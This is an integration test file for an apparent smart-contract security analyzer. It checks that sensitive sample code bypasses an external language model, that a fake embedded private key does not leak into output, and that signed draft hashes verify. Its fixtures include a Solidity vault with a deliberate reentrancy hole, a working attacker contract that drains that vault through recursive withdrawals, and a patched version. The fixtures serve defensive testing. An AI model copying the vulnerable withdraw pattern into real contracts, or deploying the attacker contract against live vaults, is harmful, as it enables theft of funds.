import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { registerHooks } from "node:module";
import { fileURLToPath } from "node:url";
import ts from "typescript";

const sourceRoot = new URL("../src/", import.meta.url);

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier === "server-only") {
      return { shortCircuit: true, url: "data:text/javascript,export%20{}" };
    }
    if (specifier === "next/server") {
      return nextResolve("next/server.js", context);
    }
    if (specifier.startsWith("@/")) {
      const path = specifier.slice(2);
      return {
        shortCircuit: true,
        url: new URL(path.endsWith(".ts") ? path : `${path}.ts`, sourceRoot).href,
      };
    }
    if (
      context.parentURL?.includes("/src/") &&
      specifier.startsWith(".") &&
      !specifier.endsWith(".ts")
    ) {
      return {
        shortCircuit: true,
        url: new URL(`${specifier}.ts`, context.parentURL).href,
      };
    }
    return nextResolve(specifier, context);
  },
  load(url, context, nextLoad) {
    if (url.endsWith(".ts")) {
      const filename = fileURLToPath(url);
      const source = readFileSync(filename, "utf8");
      const output = ts.transpileModule(source, {
        compilerOptions: {
          module: ts.ModuleKind.ESNext,
          target: ts.ScriptTarget.ES2022,
        },
        fileName: filename,
      });
      return { format: "module", shortCircuit: true, source: output.outputText };
    }
    return nextLoad(url, context);
  },
});

const { analyzeGuardianSecurityCase } = await import(
  "../src/features/guardian-security/analyze.ts"
);
const { runHybridGuardianAnalysis } = await import(
  "../src/features/guardian-llm/hybrid-analysis.ts"
);
const { issueGuardianDraftForAuthenticatedSample } = await import(
  "../src/features/guardian-draft/issuance.ts"
);
const { hashExactGuardianDraftSource, verifySignedGuardianDraftV1 } = await import(
  "../src/lib/guardian-draft-signing.ts"
);

const VULNERABLE_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// TEST ONLY - FAKE CREDENTIAL
// PRIVATE_KEY=0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

contract MysticIceVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(amount > 0, "zero amount");
        require(balances[msg.sender] >= amount, "insufficient balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");

        balances[msg.sender] -= amount;
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`;

const ATTACK_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IMysticIceVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract MysticIceAttacker {
    IMysticIceVault public immutable target;
    uint256 public attackUnit;

    constructor(address targetAddress) {
        target = IMysticIceVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "need attack funds");

        attackUnit = msg.value;

        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= attackUnit) {
            target.withdraw(attackUnit);
        }
    }
}`;

const FIXED_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MysticIceVaultFixed {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(amount > 0, "zero amount");
        require(balances[msg.sender] >= amount, "insufficient balance");

        balances[msg.sender] -= amount;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`;

const CASE_NAME = "MysticIce Classic Reentrancy";
const WALLET = "0x0A31d11Fd14029c12Ef07c2c200085aE622c1541";
const NOW = new Date("2026-08-09T00:00:00.000Z");
const SECRET = Buffer.alloc(32, 0x53).toString("base64url");
const REQUEST = {
  mode: "sample",
  sample: {
    name: CASE_NAME,
    vulnerableSource: VULNERABLE_SOURCE,
    attackSource: ATTACK_SOURCE,
    fixedSource: FIXED_SOURCE,
  },
};
const MOSS_NOT_APPLICABLE = {
  status: "not-applicable",
  reason: "User-provided samples are not registered Guardian quests.",
};

let providerCallCount = 0;
let deterministicResult;
const outcome = await runHybridGuardianAnalysis({
  request: REQUEST,
  mode: "hybrid",
  provider: {
    providerName: "must-not-run-for-sensitive-source",
    async enhance() {
      providerCallCount += 1;
      throw new Error("provider must not be called");
    },
  },
  runDeterministic: async (request) => {
    deterministicResult = analyzeGuardianSecurityCase(
      request,
      MOSS_NOT_APPLICABLE,
    );
    return deterministicResult;
  },
  now: () => new Date(NOW),
});

assert.ok(deterministicResult);
assert.equal(deterministicResult.analysis.formalType, "Classic Reentrancy");
assert.equal(outcome.kind, "deterministic");
assert.equal(providerCallCount, 0);
assert.deepEqual(outcome.externalModel, {
  status: "skipped",
  reason: "SENSITIVE_SOURCE",
});
assert.strictEqual(outcome.deterministicResult, deterministicResult);
assert.strictEqual(outcome.response, deterministicResult);
assert.deepEqual(outcome.response, deterministicResult);
assert.equal(Object.hasOwn(outcome.response, "llmEnhancement"), false);
const serializedPublicResult = JSON.stringify({
  ...outcome.response,
  externalModel: outcome.externalModel,
});
assert.doesNotMatch(
  serializedPublicResult,
  /PRIVATE_KEY|aaaaaaaa|TEST ONLY - FAKE CREDENTIAL|contract MysticIceVault\s*\{/u,
);

const signedDraft = issueGuardianDraftForAuthenticatedSample({
  analysis: outcome.response,
  authenticatedWallet: WALLET,
  caseName: CASE_NAME,
  vulnerableSource: VULNERABLE_SOURCE,
  attackSource: ATTACK_SOURCE,
  fixedSource: FIXED_SOURCE,
  secret: SECRET,
  now: () => new Date(NOW),
  randomBytes: () => Buffer.alloc(16, 0x38),
});
assert.ok(signedDraft);

const expectedVulnerableHash = createHash("sha256")
  .update(VULNERABLE_SOURCE, "utf8")
  .digest("hex");
assert.equal(
  hashExactGuardianDraftSource(VULNERABLE_SOURCE),
  expectedVulnerableHash,
);
assert.equal(
  signedDraft.claims.sourceHashes.vulnerableSource,
  expectedVulnerableHash,
);

const verifiedDraft = verifySignedGuardianDraftV1({
  value: signedDraft,
  authenticatedWallet: WALLET,
  caseName: CASE_NAME,
  vulnerableSource: VULNERABLE_SOURCE,
  attackSource: ATTACK_SOURCE,
  fixedSource: FIXED_SOURCE,
  secret: SECRET,
  now: () => new Date(NOW),
});
assert.deepEqual(verifiedDraft, signedDraft);
assert.strictEqual(signedDraft.claims.draft.analysis, deterministicResult);

console.log("PASS guardian sensitive supported integration (1 assertion chain)");
